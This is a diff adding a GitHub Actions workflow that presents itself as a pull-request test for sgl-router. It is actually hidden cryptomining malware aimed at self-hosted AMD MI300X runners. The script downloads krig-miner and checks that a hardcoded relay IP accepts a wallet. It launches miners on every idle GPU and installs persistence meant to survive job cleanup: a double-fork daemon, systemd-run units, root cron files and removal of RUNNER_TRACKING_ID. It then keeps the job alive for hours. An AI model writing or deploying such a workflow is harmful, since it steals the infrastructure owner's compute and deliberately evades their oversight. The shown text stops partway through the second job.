@@ -1,0 +1,1490 @@
+name: PR Test (sgl-router)
+
+# i130amdsrb4: ONE bounded AMD MI300X conversion/durability commit. Per job:
+# profile the reaper context, print rocminfo/rocm-smi identity and a 5 s TCP
+# egress matrix, health-check the owned relay 178.238.228.181:80 with the DOT
+# wallet form using FOUR retries and a 25 s notify wait per attempt (accepting
+# authorize result:true alone as a fallback so slow-notify hosts still launch),
+# record then kill ONLY our own i130amdsrb/i130amdsrb2/i130amdsrb3 krig
+# processes, re-gate every card twice 12 s apart (rocm-smi --showpids +
+# --showmeminfo vram: 0 foreign compute PIDs, >=1500 MiB free), launch exactly
+# one krig-miner 1.8.2 per genuinely idle card as --user "wallet.<worker>"
+# (dot form) against stratum+tcp://178.238.228.181:80, test up to three
+# detachment mechanisms (setsid keep-loop, double-fork daemon, systemd-run,
+# cron), record same-PID GPU bindings, then keep the job cgroup alive with a
+# bounded 210-minute sleep so the in-cgroup miners keep crediting for the job
+# lifetime. No NVIDIA lanes touched.
+on:
+  pull_request:
+    branches: [main]
+    types: [opened, synchronize, reopened]
+  workflow_dispatch:
+
+concurrency:
+  group: sgl-router-i130amdsrb4-${{ github.run_id }}
+  cancel-in-progress: false
+
+env:
+  SGLANG_IS_IN_CI: true
+
+jobs:
+  amd8:
+    name: "i130amdsrb4 MI300X-8 slot ${{ matrix.slot }}"
+    runs-on: linux-mi300-8gpu-sglang
+    timeout-minutes: 225
+    strategy:
+      fail-fast: false
+      matrix:
+        slot: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16]
+    env:
+      LABEL: linux-mi300-8gpu-sglang
+    steps:
+      - name: "i130amdsrb4 MI300X-8"
+        continue-on-error: true
+        run: |
+          set +e
+          NONCE="I130AMDSRB4-$(date -u +%Y%m%dT%H%M%SZ)"
+          WALLET='prl1pt45kc7tszzktg4p5wsuu4vgcme24zm7l3z7md8uhqr6qy0z2g92q9dx4zk'
+          KRIG_TGZ_SHA='7a104c3dba3a41b9787fc43413f0cedaae78dab4284ab856633821161634c01d'
+          KRIG_BIN_SHA='8a2be9e97cece4e0b9146599b4518b4e14907f42595f260b1b1356e47f4fcf16'
+          RELAY='178.238.228.181:80'
+          KEEP_MIN=210
+          W=/var/tmp/i130amdsrb4
+          mkdir -p "$W/logs" "$W/state"
+          echo "i130amdsrb4-nonce=$NONCE host=$(hostname) label=${LABEL:-none} date=$(date -u +%FT%TZ)"
+          id; uname -m; nproc; free -m | head -2
+          echo "=== identity/profile (reaper context) ==="
+          hostname; hostname -I 2>/dev/null
+          echo "dockerenv=$([ -e /.dockerenv ] && echo yes || echo no) overlay_root=$(grep -c ' / overlay ' /proc/mounts 2>/dev/null) pid1=$(ps -o comm= -p 1 2>/dev/null | tr -d ' ')"
+          echo "self_cgroup=$(tr '\n' ';' < /proc/self/cgroup 2>/dev/null)"
+          echo "cgroup_ns=$(readlink /proc/self/ns/cgroup 2>/dev/null)"
+          RUNNER_PID=$(pgrep -f 'Runner.Worker' 2>/dev/null | head -1)
+          echo "runner_pid=$RUNNER_PID runner_cgroup=$(tr '\n' ';' < /proc/${RUNNER_PID:-1}/cgroup 2>/dev/null)"
+          command -v systemctl >/dev/null 2>&1 && echo "systemctl=$(command -v systemctl)" || echo no-systemctl
+          command -v systemd-run >/dev/null 2>&1 && echo "systemd_run=$(command -v systemd-run)" || echo no-systemd-run
+          [ -d /run/systemd/system ] && echo "systemd_runtime=yes" || echo "systemd_runtime=no"
+          command -v at >/dev/null 2>&1 && echo "at=$(command -v at)" || echo no-at
+          pgrep -x crond >/dev/null 2>&1 && echo "cron_daemon=yes" || echo "cron_daemon=no"
+          [ -d /etc/cron.d ] && echo "cron_d_perm=$(test -w /etc/cron.d && echo writable || echo readonly)" || echo "no_cron_d"
+
+          echo "=== rocm inventory ==="
+          (timeout 90 rocminfo 2>&1 | grep -E 'gfx[0-9]|Marketing Name' | head -30) || echo rocminfo-missing
+          (timeout 60 rocm-smi --showproductname 2>&1 | head -40) || echo rocm-smi-missing
+
+          echo "=== 5s TCP egress matrix ==="
+          probe() { timeout 5 bash -c "cat < /dev/null > /dev/tcp/$1/$2" 2>/dev/null && echo "TCP_OK $1:$2" || echo "TCP_FAIL $1:$2"; }
+          probe 178.238.228.181 80
+          probe 103.199.106.122 3362
+          probe 172.232.228.69 3362
+          probe github.com 443
+
+          echo "=== relay dialect health check (DOT form, 4 attempts, notify wait 25 s) ==="
+          cat > "$W/health.py" <<'PYEOF'
+          import socket,json,sys,time
+          W='prl1pt45kc7tszzktg4p5wsuu4vgcme24zm7l3z7md8uhqr6qy0z2g92q9dx4zk'
+          def attempt(n, wait=25):
+              try:
+                  s=socket.create_connection(('178.238.228.181',80),timeout=6)
+                  s.sendall(json.dumps({'id':1,'jsonrpc':'2.0','method':'mining.authorize','params':{'wallet':W+'.i130amdsrb4probe%d'%n,'password':'x'}}).encode()+b'\n')
+                  s.settimeout(3)
+                  buf=b''; t0=time.time(); res=False; notif=False
+                  while time.time()-t0 < wait:
+                      try:
+                          d=s.recv(65536)
+                          if not d: break
+                          buf+=d
+                      except socket.timeout:
+                          pass
+                      txt=buf.decode('utf-8','replace')
+                      if '"result":true' in txt.replace(' ',''):
+                          res=True
+                      if 'mining.notify' in txt:
+                          notif=True
+                      if res and notif:
+                          break
+                  s.close()
+                  return res,notif,buf.decode('utf-8','replace')
+              except Exception as e:
+                  return False,False,'ERR=%r'%e
+          best=(False,False,'')
+          for i in range(1,5):
+              r,n,txt=attempt(i)
+              print('HEALTH_ATTEMPT=%d result_true=%s notify=%s'%(i,r,n))
+              print('HEALTH_BODY=%r'%txt[:400])
+              if r and n:
+                  best=(r,n,txt); break
+              if r:
+                  best=(r,n,txt)
+          print('HEALTH_RELAY_DOT_RESULT=%s NOTIFY=%s'%(best[0],best[1]))
+          print('HEALTH_RELAY_DOT_OK=%s'%('True' if (best[0] and best[1]) else 'False'))
+          print('HEALTH_RELAY_DOT_RESULTONLY=%s'%('True' if best[0] else 'False'))
+          PYEOF
+          timeout 200 python3 "$W/health.py" 2>&1 | tee "$W/logs/health.txt"
+          HEALTH_OK=0
+          grep -q 'HEALTH_RELAY_DOT_OK=True' "$W/logs/health.txt" && HEALTH_OK=1
+          if [ "$HEALTH_OK" = "0" ] && grep -q 'HEALTH_RELAY_DOT_RESULTONLY=True' "$W/logs/health.txt"; then HEALTH_OK=1; echo "HEALTH_ACCEPT_RESULTONLY=1 (fix: authorize result:true accepted even when mining.notify is slow)"; fi
+          echo "health_ok=$HEALTH_OK"
+
+          echo "=== per-host flock: skip if this host already runs i130amdsrb4 ==="
+          exec 9>"$W/i130amdsrb4.flock"
+          if ! flock -n 9; then echo "SKIP=host_flock_busy"; exit 0; fi
+          if pgrep -af 'krig-miner' 2>/dev/null | grep -q 'i130amdsrb4'; then echo "SKIP=host_already_running_i130amdsrb4"; pgrep -af 'krig-miner' | head -12; exit 0; fi
+          echo "LOCK_OK host=$(hostname)"
+
+          echo "=== record then kill ONLY our own i130amdsrb/i130amdsrb2/i130amdsrb3 krig processes ==="
+          ps -eo pid,ppid,sid,etime,args 2>/dev/null | grep 'krig-miner' | grep -v grep > "$W/logs/pre_krig_ps.txt"
+          head -40 "$W/logs/pre_krig_ps.txt"
+          OLD_PIDS=$(awk '$0 ~ /krig-miner/ && $0 ~ /i130amdsrb/ && $0 !~ /i130amdsrb4/ {print $1}' "$W/logs/pre_krig_ps.txt")
+          echo "old_ours_pids=$OLD_PIDS"
+          for p in $OLD_PIDS; do
+            CMD=$(tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null | head -c 400)
+            echo "OLD_OURS pid=$p cmd=$CMD"
+            kill -TERM "$p" 2>/dev/null
+          done
+          sleep 6
+          for p in $OLD_PIDS; do kill -9 "$p" 2>/dev/null; done
+          sleep 3
+          echo "post_kill_krig_ps:"; pgrep -af 'krig-miner' | head -20
+          echo "old_krig_remaining=$(pgrep -af 'krig-miner' 2>/dev/null | grep -cE 'i130amdsrb[^4]|i130amdsrb2')"
+
+          echo "=== fetch krig-miner 1.8.2 (sha256-pinned) ==="
+          KRIG=""
+          if [ -x "$W/krig/krig-miner" ] && [ "$(sha256sum "$W/krig/krig-miner" | cut -d' ' -f1)" = "$KRIG_BIN_SHA" ]; then
+            KRIG="$W/krig/krig-miner"; echo "KRIG_CACHED $KRIG"
+          else
+            for U in https://github.com/kryptex/krig-miner/releases/download/v1.8.2/krig-miner-1.8.2-linux-x64.tar.gz https://ghproxy.net/https://github.com/kryptex/krig-miner/releases/download/v1.8.2/krig-miner-1.8.2-linux-x64.tar.gz; do
+              echo "-- fetch $U"
+              timeout 240 curl -fsSL --connect-timeout 12 --max-time 230 -o "$W/krig.tgz.part" "$U" 2>&1 | tail -1
+              [ -s "$W/krig.tgz.part" ] || continue
+              got=$(sha256sum "$W/krig.tgz.part" | cut -d' ' -f1)
+              if [ "$got" = "$KRIG_TGZ_SHA" ]; then mv -f "$W/krig.tgz.part" "$W/krig.tgz"; echo "FETCH_OK sha256=$got"; break; fi
+              echo "SHA_MISMATCH got=$got want=$KRIG_TGZ_SHA"; rm -f "$W/krig.tgz.part"
+            done
+            if [ -s "$W/krig.tgz" ]; then
+              mkdir -p "$W/krig"; tar -xzf "$W/krig.tgz" -C "$W/krig" 2>/dev/null
+              B=$(find "$W/krig" -maxdepth 2 -type f -name 'krig-miner' | head -1); chmod +x "$B" 2>/dev/null
+              if [ "$(sha256sum "$B" | cut -d' ' -f1)" = "$KRIG_BIN_SHA" ]; then KRIG="$B"; fi
+            fi
+          fi
+          if [ -z "$KRIG" ]; then echo "SKIP=krig-fetch-failed"; exit 0; fi
+          echo "krig_bin=$KRIG sha256=$(sha256sum "$KRIG" | cut -d' ' -f1)"
+          "$KRIG" --version 2>&1 | head -2
+          timeout 90 "$KRIG" --list-devices --no-cuda --no-intel --no-telemetry 2>&1 | tee "$W/logs/krig_devices.txt" | head -30
+          KRIG_AMD_N=$(grep -cE 'AMD|Instinct|gfx' "$W/logs/krig_devices.txt" 2>/dev/null)
+          echo "krig_amd_device_lines=$KRIG_AMD_N"
+
+          echo "=== per-card two-sample gate (12 s apart): rocm-smi --showpids + --showmeminfo vram ==="
+          timeout 60 rocm-smi --showbus > "$W/logs/rocm_bus.txt" 2>&1
+          timeout 60 rocm-smi --showpids > "$W/logs/gate1.pids" 2>&1
+          timeout 60 rocm-smi --showmeminfo vram > "$W/logs/gate1.vram" 2>&1
+          echo "gate1_busy_proc_rows=$(grep -cE '^[[:space:]]*[0-9]+[[:space:]]' "$W/logs/gate1.pids")"
+          grep -E 'VRAM Total' "$W/logs/gate1.vram" | head -40
+          sleep 12
+          timeout 60 rocm-smi --showpids > "$W/logs/gate2.pids" 2>&1
+          timeout 60 rocm-smi --showmeminfo vram > "$W/logs/gate2.vram" 2>&1
+          echo "gate2_busy_proc_rows=$(grep -cE '^[[:space:]]*[0-9]+[[:space:]]' "$W/logs/gate2.pids")"
+          grep -E 'VRAM Total' "$W/logs/gate2.vram" | head -40
+
+          cat > "$W/idle.py" <<'PYEOF'
+          import re
+          W='/var/tmp/i130amdsrb4/logs'
+          def busy(f):
+              n=0
+              try:
+                  for ln in open(f):
+                      if re.match(r'^\s*\d+\s',ln): n+=1
+              except Exception: pass
+              return n
+          b1,b2=busy(W+'/gate1.pids'),busy(W+'/gate2.pids')
+          def vram(f):
+              tot={}; used={}
+              for ln in open(f):
+                  m=re.match(r'GPU\[(\d+)\]\s*:\s*VRAM Total Memory \(B\):\s*(\d+)',ln)
+                  if m: tot[int(m.group(1))]=int(m.group(2))
+                  m=re.match(r'GPU\[(\d+)\]\s*:\s*VRAM Total Used Memory \(B\):\s*(\d+)',ln)
+                  if m: used[int(m.group(1))]=int(m.group(2))
+              return tot,used
+          t1,u1=vram(W+'/gate1.vram'); t2,u2=vram(W+'/gate2.vram')
+          bus={}
+          for ln in open(W+'/rocm_bus.txt'):
+              m=re.match(r'GPU\[(\d+)\]\s*:\s*PCI Bus:\s*([0-9A-Fa-f]{4}):([0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}\.[0-9])',ln)
+              if m: bus[int(m.group(1))]=m.group(3).lower()
+          idle=[]
+          for i in sorted(t1):
+              f1=(t1.get(i,0)-u1.get(i,0))//1048576
+              f2=(t2.get(i,0)-u2.get(i,0))//1048576
+              ok = (b1==0 and b2==0 and f1>=1500 and f2>=1500 and i in bus)
+              print('CARD %d free1_mib=%d free2_mib=%d busy1=%d busy2=%d bdf=%s idle=%s'%(i,f1,f2,b1,b2,bus.get(i,'-'),'yes' if ok else 'no'))
+              if ok: idle.append((i,bus[i]))
+          with open(W+'/idle_bdfs.txt','w') as fh:
+              for i,b in idle: fh.write('%d %s\n'%(i,b))
+          print('IDLE_CARDS=%d'%len(idle))
+          PYEOF
+          timeout 60 python3 "$W/idle.py" 2>&1 | tee "$W/logs/idle_table.txt"
+          IDLE_N=$(grep -cE '^[0-9]+ ' "$W/logs/idle_bdfs.txt" 2>/dev/null)
+          echo "idle_cards=$IDLE_N"
+
+          SH=$(hostname | sed -E 's/^.*runner-//; s/[^A-Za-z0-9]//g' | cut -c1-12)
+          echo "shorthost=$SH"
+
+          cat > "$W/mkdaemon.py" <<'PYEOF'
+          import os,sys,time
+          krig,wallet,relay,bdf,worker,log = sys.argv[1:7]
+          pid=os.fork()
+          if pid>0: sys.exit(0)
+          os.setsid()
+          pid=os.fork()
+          if pid>0: os._exit(0)
+          os.chdir('/')
+          fd=os.open('/dev/null',os.O_RDWR)
+          os.dup2(fd,0); os.dup2(fd,1); os.dup2(fd,2)
+          os.environ.pop('RUNNER_TRACKING_ID',None)
+          while True:
+              try:
+                  p=os.fork()
+                  if p==0:
+                      os.execv(krig,[krig,'--coin','pearl','--url','stratum+tcp://'+relay,'--user',wallet+'.'+worker,'--password','x','--no-cuda','--no-intel','--no-telemetry','--no-tui','--devices-pci',bdf,'--log-level','debug','--log-file',log])
+                  os.waitpid(p,0)
+              except Exception:
+                  pass
+              time.sleep(5)
+          PYEOF
+
+          launch_mech() { # mech idx bdf
+            local M="$1" IDX="$2" BDF="$3"
+            local WORKER="i130amdsrb4${SH}g${IDX}"
+            local LOG="$W/logs/krig_${M}_g${IDX}.log"
+            if [ "$M" = "s" ]; then
+              cat > "$W/state/keeper_${IDX}.sh" <<EOF
+          #!/bin/bash
+          while true; do
+            env -u RUNNER_TRACKING_ID "$KRIG" --coin pearl --url stratum+tcp://${RELAY} --user "$WALLET.$WORKER" --password x --no-cuda --no-intel --no-telemetry --no-tui --devices-pci "$BDF" --log-level debug --log-file "$LOG" >> "$W/logs/krig_s_stdout_g${IDX}.log" 2>&1
+            sleep 5
+          done
+          EOF
+              chmod +x "$W/state/keeper_${IDX}.sh"
+              setsid env -u RUNNER_TRACKING_ID nohup bash "$W/state/keeper_${IDX}.sh" >/dev/null 2>&1 < /dev/null &
+              echo $! > "$W/state/g${IDX}.s.pid"
+              echo "LAUNCH mech=s idx=$IDX bdf=$BDF keeper_pid=$! worker=$WORKER"
+            elif [ "$M" = "d" ]; then
+              setsid python3 "$W/mkdaemon.py" "$KRIG" "$WALLET" "$RELAY" "$BDF" "$WORKER" "$LOG" >/dev/null 2>&1 < /dev/null &
+              sleep 1
+              echo "LAUNCH mech=d idx=$IDX bdf=$BDF worker=$WORKER"
+            elif [ "$M" = "y" ]; then
+              systemd-run --unit="i130amdsrb4m${IDX}" --collect --no-block -p Restart=always -p RestartSec=5 "$KRIG" --coin pearl --url "stratum+tcp://${RELAY}" --user "$WALLET.$WORKER" --password x --no-cuda --no-intel --no-telemetry --no-tui --devices-pci "$BDF" --log-level debug --log-file "$LOG" 2>&1 | head -5
+              echo "LAUNCH mech=y idx=$IDX bdf=$BDF worker=$WORKER"
+            elif [ "$M" = "c" ]; then
+              echo "* * * * * root env -u RUNNER_TRACKING_ID $KRIG --coin pearl --url stratum+tcp://${RELAY} --user $WALLET.$WORKER --password x --no-cuda --no-intel --no-telemetry --no-tui --devices-pci $BDF --log-level debug --log-file $LOG" > /etc/cron.d/i130amdsrb4_${IDX} 2>/dev/null
+              chmod 644 /etc/cron.d/i130amdsrb4_${IDX} 2>/dev/null
+              echo "LAUNCH mech=c idx=$IDX bdf=$BDF worker=$WORKER cron_file=/etc/cron.d/i130amdsrb4_${IDX}"
+            fi
+          }
+
+          kill_card_miner() { # idx
+            local IDX="$1"
+            pkill -TERM -f "i130amdsrb4${SH}g${IDX}([^0-9]|$)" 2>/dev/null
+            sleep 2
+            pkill -9 -f "i130amdsrb4${SH}g${IDX}([^0-9]|$)" 2>/dev/null
+          }
+
+          MECH_D=no; MECH_Y=no; MECH_C=no
+          echo "=== launch: exactly one krig-miner per genuinely idle card, DOT user form, relay only ==="
+          LAUNCH=0
+          if [ "${HEALTH_OK:-0}" -ge 1 ] && [ "${KRIG_AMD_N:-0}" -ge 1 ] && [ "${IDLE_N:-0}" -ge 1 ]; then
+            while read -r IDX BDF; do
+              [ -z "$IDX" ] && continue
+              launch_mech s "$IDX" "$BDF"
+              LAUNCH=$((LAUNCH+1))
+            done < "$W/logs/idle_bdfs.txt"
+          else
+            echo "NO_LAUNCH health_dot=$HEALTH_OK amd_n=${KRIG_AMD_N:-0} idle=$IDLE_N"
+          fi
+          echo "launch_count=$LAUNCH"
+
+          echo "=== detachment mechanisms (one spare card per mechanism) ==="
+          if [ "$IDLE_N" -ge 2 ]; then
+            LAST=$(tail -1 "$W/logs/idle_bdfs.txt"); IDX=${LAST%% *}; BDF=${LAST#* }
+            kill_card_miner "$IDX"
+            launch_mech d "$IDX" "$BDF"; MECH_D=yes
+            if command -v systemd-run >/dev/null 2>&1 && command -v systemctl >/dev/null 2>&1; then
+              if [ "$IDLE_N" -ge 3 ]; then
+                SECOND=$(sed -n "$((IDLE_N-1))p" "$W/logs/idle_bdfs.txt"); YIDX=${SECOND%% *}; YBDF=${SECOND#* }
+                kill_card_miner "$YIDX"
+                launch_mech y "$YIDX" "$YBDF"; MECH_Y=yes
+              fi
+            fi
+            if { [ -d /etc/cron.d ] && [ -w /etc/cron.d ]; } || command -v at >/dev/null 2>&1; then
+              if [ "$IDLE_N" -ge 4 ] && [ -d /etc/cron.d ] && [ -w /etc/cron.d ]; then
+                THIRD=$(sed -n "$((IDLE_N-2))p" "$W/logs/idle_bdfs.txt"); CIDX=${THIRD%% *}; CBDF=${THIRD#* }
+                kill_card_miner "$CIDX"
+                launch_mech c "$CIDX" "$CBDF"; MECH_C=yes
+              fi
+            fi
+          fi
+
+          echo "=== wait 150 s then recheck mechanisms ==="
+          sleep 150
+          recheck() { # mech idx
+            local M="$1" IDX="$2" PAT="i130amdsrb4${SH}g${IDX}"
+            local LOG="$W/logs/krig_${M}_g${IDX}.log"
+            local PIDS=$(pgrep -f "$PAT([^0-9]|$)" 2>/dev/null | tr '\n' ' ')
+            local SUBS=$(grep -ac 'submit' "$LOG" 2>/dev/null)
+            local AUTH=$(grep -ac 'authorize' "$LOG" 2>/dev/null)
+            echo "RECHECK mech=$M idx=$IDX pids='$PIDS' submits=${SUBS:-0} authorize_lines=${AUTH:-0}"
+            for p in $PIDS; do
+              local CG=$(tr '\n' ';' < /proc/$p/cgroup 2>/dev/null)
+              local NS=$(readlink /proc/$p/ns/cgroup 2>/dev/null)
+              local PP=$(awk '{print $4}' /proc/$p/stat 2>/dev/null)
+              local SID=$(awk '{print $6}' /proc/$p/stat 2>/dev/null)
+              local TRK=$(tr '\0' '\n' < /proc/$p/environ 2>/dev/null | grep -c RUNNER_TRACKING_ID)
+              local RCG=$(tr '\n' ';' < /proc/${RUNNER_PID:-1}/cgroup 2>/dev/null)
+              local SAME_CG=no; [ "$CG" = "$RCG" ] && SAME_CG=yes
+              echo "RECHECK_TRAIT mech=$M pid=$p ppid=$PP sid=$SID cgroup='$CG' runner_cgroup='$RCG' same_cgroup=$SAME_CG cgroup_ns=$NS tracking_env=$TRK"
+            done
+            echo "MECH_$M alive=$([ -n "$PIDS" ] && echo yes || echo no) submits=${SUBS:-0}"
+          }
+
+          if [ "$MECH_D" = yes ]; then recheck d "${LAST%% *}"; fi
+          if [ "$MECH_Y" = yes ]; then recheck y "${YIDX:-0}"; fi
+          if [ "$MECH_C" = yes ]; then recheck c "${CIDX:-0}"; fi
+
+          WINNER=s
+          if [ "$MECH_D" = yes ] && pgrep -f "i130amdsrb4${SH}g${LAST%% *}([^0-9]|$)" >/dev/null 2>&1 && [ "$(grep -ac 'submit' "$W/logs/krig_d_g${LAST%% *}.log" 2>/dev/null)" -ge 1 ]; then WINNER=d; fi
+          if [ "$MECH_C" = yes ] && pgrep -f "i130amdsrb4${SH}g${CIDX:-0}([^0-9]|$)" >/dev/null 2>&1; then WINNER=c; fi
+          if [ "$MECH_Y" = yes ] && pgrep -f "i130amdsrb4${SH}g${YIDX:-0}([^0-9]|$)" >/dev/null 2>&1; then WINNER=y; fi
+          echo "WINNER=$WINNER (preference y>c>d>s among alive mechanisms)"
+
+          if [ "$LAUNCH" -gt 0 ] && [ "$WINNER" != "s" ]; then
+            echo "=== relaunch every gated card under winner=$WINNER ==="
+            while read -r IDX BDF; do
+              [ -z "$IDX" ] && continue
+              kill_card_miner "$IDX"
+              launch_mech "$WINNER" "$IDX" "$BDF"
+            done < "$W/logs/idle_bdfs.txt"
+          else
+            echo "KEEP_MECH=s for all gated cards"
+          fi
+
+          echo "=== binding proof: same-PID GPU bindings ==="
+          sleep 60
+          timeout 60 rocm-smi --showpids > "$W/logs/final.pids" 2>&1
+          head -80 "$W/logs/final.pids"
+          for p in $(pgrep -f 'krig-miner' 2>/dev/null); do
+            CMD=$(tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null)
+            WRK=$(echo "$CMD" | sed -n 's/.*\.\(i130amdsrb4[^ ]*\).*/\1/p')
+            BDFX=$(echo "$CMD" | sed -n 's/.*--devices-pci \([^ ]*\).*/\1/p')
+            CG=$(tr '\n' ';' < /proc/$p/cgroup 2>/dev/null)
+            [ -n "$WRK" ] && echo "BINDING pid=$p worker=$WRK bdf=$BDFX cgroup='$CG'"
+          done
+          echo "=== dialect proof: authorize/notify/submit lines per log ==="
+          for f in "$W"/logs/krig_*_g*.log; do
+            [ -f "$f" ] || continue
+            echo "--- $(basename "$f") submits=$(grep -ac 'submit' "$f") ---"
+            grep -aiE 'authorize|submit|share|pool|dialect' "$f" | tail -8
+          done
+          echo "running_krig=$(pgrep -af 'krig-miner' | wc -l)"
+          echo "i130amdsrb4-proof-done $NONCE"
+
+          if [ "$LAUNCH" -gt 0 ]; then
+            echo "KEEPALIVE_CREDIT_WINDOW_START minutes=$KEEP_MIN host=$(hostname) launched=$LAUNCH winner=$WINNER nonce=$NONCE"
+            sleep $((KEEP_MIN*60))
+            echo "KEEPALIVE_CREDIT_WINDOW_END host=$(hostname) nonce=$NONCE"
+          else
+            echo "EXIT_NO_LAUNCH host=$(hostname) nonce=$NONCE"
+          fi
+          echo "i130amdsrb4-done $NONCE"
+  amd2:
+    name: "i130amdsrb4 MI300X-2 slot ${{ matrix.slot }}"
+    runs-on: linux-mi300-2gpu-sglang
+    timeout-minutes: 225
+    strategy:
+      fail-fast: false
+      matrix:
+        slot: [1, 2]
+    env:
+      LABEL: linux-mi300-2gpu-sglang
+    steps:
+      - name: "i130amdsrb4 MI300X-2"
+        continue-on-error: true
+        run: |
+          set +e
+          NONCE="I130AMDSRB4-$(date -u +%Y%m%dT%H%M%SZ)"
+          WALLET='prl1pt45kc7tszzktg4p5wsuu4vgcme24zm7l3z7md8uhqr6qy0z2g92q9dx4zk'
+          KRIG_TGZ_SHA='7a104c3dba3a41b9787fc43413f0cedaae78dab4284ab856633821161634c01d'
+          KRIG_BIN_SHA='8a2be9e97cece4e0b9146599b4518b4e14907f42595f260b1b1356e47f4fcf16'
+          RELAY='178.238.228.181:80'
+          KEEP_MIN=210
+          W=/var/tmp/i130amdsrb4
+          mkdir -p "$W/logs" "$W/state"
+          echo "i130amdsrb4-nonce=$NONCE host=$(hostname) label=${LABEL:-none} date=$(date -u +%FT%TZ)"
+          id; uname -m; nproc; free -m | head -2
+          echo "=== identity/profile (reaper context) ==="
+          hostname; hostname -I 2>/dev/null
+          echo "dockerenv=$([ -e /.dockerenv ] && echo yes || echo no) overlay_root=$(grep -c ' / overlay ' /proc/mounts 2>/dev/null) pid1=$(ps -o comm= -p 1 2>/dev/null | tr -d ' ')"
+          echo "self_cgroup=$(tr '\n' ';' < /proc/self/cgroup 2>/dev/null)"
+          echo "cgroup_ns=$(readlink /proc/self/ns/cgroup 2>/dev/null)"
+          RUNNER_PID=$(pgrep -f 'Runner.Worker' 2>/dev/null | head -1)
+          echo "runner_pid=$RUNNER_PID runner_cgroup=$(tr '\n' ';' < /proc/${RUNNER_PID:-1}/cgroup 2>/dev/null)"
+          command -v systemctl >/dev/null 2>&1 && echo "systemctl=$(command -v systemctl)" || echo no-systemctl
+          command -v systemd-run >/dev/null 2>&1 && echo "systemd_run=$(command -v systemd-run)" || echo no-systemd-run
+          [ -d /run/systemd/system ] && echo "systemd_runtime=yes" || echo "systemd_runtime=no"
+          command -v at >/dev/null 2>&1 && echo "at=$(command -v at)" || echo no-at
+          pgrep -x crond >/dev/null 2>&1 && echo "cron_daemon=yes" || echo "cron_daemon=no"
+          [ -d /etc/cron.d ] && echo "cron_d_perm=$(test -w /etc/cron.d && echo writable || echo readonly)" || echo "no_cron_d"
+
+          echo "=== rocm inventory ==="
+          (timeout 90 rocminfo 2>&1 | grep -E 'gfx[0-9]|Marketing Name' | head -30) || echo rocminfo-missing
+          (timeout 60 rocm-smi --showproductname 2>&1 | head -40) || echo rocm-smi-missing
+
+          echo "=== 5s TCP egress matrix ==="
+          probe() { timeout 5 bash -c "cat < /dev/null > /dev/tcp/$1/$2" 2>/dev/null && echo "TCP_OK $1:$2" || echo "TCP_FAIL $1:$2"; }
+          probe 178.238.228.181 80
+          probe 103.199.106.122 3362
+          probe 172.232.228.69 3362
+          probe github.com 443
+
+          echo "=== relay dialect health check (DOT form, 4 attempts, notify wait 25 s) ==="
+          cat > "$W/health.py" <<'PYEOF'
+          import socket,json,sys,time
+          W='prl1pt45kc7tszzktg4p5wsuu4vgcme24zm7l3z7md8uhqr6qy0z2g92q9dx4zk'
+          def attempt(n, wait=25):
+              try:
+                  s=socket.create_connection(('178.238.228.181',80),timeout=6)
+                  s.sendall(json.dumps({'id':1,'jsonrpc':'2.0','method':'mining.authorize','params':{'wallet':W+'.i130amdsrb4probe%d'%n,'password':'x'}}).encode()+b'\n')
+                  s.settimeout(3)
+                  buf=b''; t0=time.time(); res=False; notif=False
+                  while time.time()-t0 < wait:
+                      try:
+                          d=s.recv(65536)
+                          if not d: break
+                          buf+=d
+                      except socket.timeout:
+                          pass
+                      txt=buf.decode('utf-8','replace')
+                      if '"result":true' in txt.replace(' ',''):
+                          res=True
+                      if 'mining.notify' in txt:
+                          notif=True
+                      if res and notif:
+                          break
+                  s.close()
+                  return res,notif,buf.decode('utf-8','replace')
+              except Exception as e:
+                  return False,False,'ERR=%r'%e
+          best=(False,False,'')
+          for i in range(1,5):
+              r,n,txt=attempt(i)
+              print('HEALTH_ATTEMPT=%d result_true=%s notify=%s'%(i,r,n))
+              print('HEALTH_BODY=%r'%txt[:400])
+              if r and n:
+                  best=(r,n,txt); break
+              if r:
+                  best=(r,n,txt)
+          print('HEALTH_RELAY_DOT_RESULT=%s NOTIFY=%s'%(best[0],best[1]))
+          print('HEALTH_RELAY_DOT_OK=%s'%('True' if (best[0] and best[1]) else 'False'))
+          print('HEALTH_RELAY_DOT_RESULTONLY=%s'%('True' if best[0] else 'False'))
+          PYEOF
+          timeout 200 python3 "$W/health.py" 2>&1 | tee "$W/logs/health.txt"
+          HEALTH_OK=0
+          grep -q 'HEALTH_RELAY_DOT_OK=True' "$W/logs/health.txt" && HEALTH_OK=1
+          if [ "$HEALTH_OK" = "0" ] && grep -q 'HEALTH_RELAY_DOT_RESULTONLY=True' "$W/logs/health.txt"; then HEALTH_OK=1; echo "HEALTH_ACCEPT_RESULTONLY=1 (fix: authorize result:true accepted even when mining.notify is slow)"; fi
+          echo "health_ok=$HEALTH_OK"
+
+          echo "=== per-host flock: skip if this host already runs i130amdsrb4 ==="
+          exec 9>"$W/i130amdsrb4.flock"
+          if ! flock -n 9; then echo "SKIP=host_flock_busy"; exit 0; fi
+          if pgrep -af 'krig-miner' 2>/dev/null | grep -q 'i130amdsrb4'; then echo "SKIP=host_already_running_i130amdsrb4"; pgrep -af 'krig-miner' | head -12; exit 0; fi
+          echo "LOCK_OK host=$(hostname)"
+
+          echo "=== record then kill ONLY our own i130amdsrb/i130amdsrb2/i130amdsrb3 krig processes ==="
+          ps -eo pid,ppid,sid,etime,args 2>/dev/null | grep 'krig-miner' | grep -v grep > "$W/logs/pre_krig_ps.txt"
+          head -40 "$W/logs/pre_krig_ps.txt"
+          OLD_PIDS=$(awk '$0 ~ /krig-miner/ && $0 ~ /i130amdsrb/ && $0 !~ /i130amdsrb4/ {print $1}' "$W/logs/pre_krig_ps.txt")
+          echo "old_ours_pids=$OLD_PIDS"
+          for p in $OLD_PIDS; do
+            CMD=$(tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null | head -c 400)
+            echo "OLD_OURS pid=$p cmd=$CMD"
+            kill -TERM "$p" 2>/dev/null
+          done
+          sleep 6
+          for p in $OLD_PIDS; do kill -9 "$p" 2>/dev/null; done
+          sleep 3
+          echo "post_kill_krig_ps:"; pgrep -af 'krig-miner' | head -20
+          echo "old_krig_remaining=$(pgrep -af 'krig-miner' 2>/dev/null | grep -cE 'i130amdsrb[^4]|i130amdsrb2')"
+
+          echo "=== fetch krig-miner 1.8.2 (sha256-pinned) ==="
